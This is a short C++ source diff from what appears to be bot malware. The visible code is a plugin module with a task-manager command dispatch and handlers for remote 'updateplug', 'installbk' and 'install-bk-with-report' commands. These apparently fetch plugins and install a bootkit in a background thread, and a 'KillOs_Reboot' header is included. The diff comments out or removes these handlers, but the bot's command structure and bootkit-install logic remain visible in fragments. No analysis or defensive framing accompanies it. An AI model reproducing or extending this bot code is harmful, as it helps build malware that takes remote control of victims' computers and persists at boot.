@@ -8,7 +8,7 @@
 #include "HTTPConsts.h"
 #include "Task.h"
 #include "md5.h"
-#include "KillOs_Reboot.h"
+//#include "KillOs_Reboot.h"
 #include "DbgRpt.h"
 
 //---------------------------------------------------------------------------
@@ -814,11 +814,8 @@ LPBYTE Plugin::DownloadFromCache(PCHAR PluginName, bool IsExecutable,  PCHAR Cac
     return Buf;
 }
 //---------------------------------------------------------------------------
-const char* Plugin::CommandUpdatePlug    = "updateplug";
-const char* Plugin::CommandInstallBk     = "installbk";
-const char* Plugin::CommandInstallBkStat = "install-bk-with-report";
 
-
+/*
 bool Plugin::ExecuteUpdatePlug(PTaskManager Manager, PCHAR Command, PCHAR Args)
 {
 	CHAR  PlugName[MAX_BOT_PLUG_NAME_SIZE];
@@ -1006,9 +1003,11 @@ bool Plugin::ExecuteInstallBk(void* Manager, PCHAR Command, PCHAR Args)
 	return true;
 }
 
+
+
 bool Plugin::ExecuteInstallBkStat(void* Manager, PCHAR Command, PCHAR Args)
 {
-/*	PDBG("ExecuteInstallBkStat", "Args: '%s'", Args);
+	PDBG("ExecuteInstallBkStat", "Args: '%s'", Args);
 
 	PCHAR ParamList = STR::New(Args);
 
@@ -1018,10 +1017,10 @@ bool Plugin::ExecuteInstallBkStat(void* Manager, PCHAR Command, PCHAR Args)
 
 	StartThread(AsyncInstallBk, STR::New(PlugName.t_str()));
 
-	STR::Free(ParamList); */
+	STR::Free(ParamList);
 	return true;
 }
-
+*/
 
 //*****************************************************************************
 //                                        TPlugin
